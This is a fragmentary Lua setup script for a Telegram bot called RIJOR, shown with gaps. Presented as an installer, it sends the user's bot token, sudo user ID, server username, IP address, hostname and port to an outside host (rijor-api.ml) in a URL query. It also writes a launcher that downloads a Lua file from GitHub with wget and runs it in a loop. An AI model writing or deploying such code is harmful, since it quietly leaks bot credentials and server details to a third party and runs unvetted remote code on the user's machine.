...
local token = io.read()
if token ~= '' then
data,res = https.request("https://Rijor-api.ml/index.php?p=RIJOTEAM")
if res == 200 then
tr = json:decode(data)
...
data,res = https.request("https://Rijor-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
...
http.request("https://rijor-api.ml/index.php?n=RIJOTEAM&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
local RunBot = io.open("RIJOR", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/BoykA
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr BoykA.lua
wget "https://raw.githubusercontent.com/RIJOTEAM/RIJOR/main/RIJOR.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./RIJOR.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
...
while(true) do
rm -fr ../.telegram-cli
screen -S RIJOR -X kill
screen -S RIJOR ./RIJOR
done
]])
RunTs:close()
end
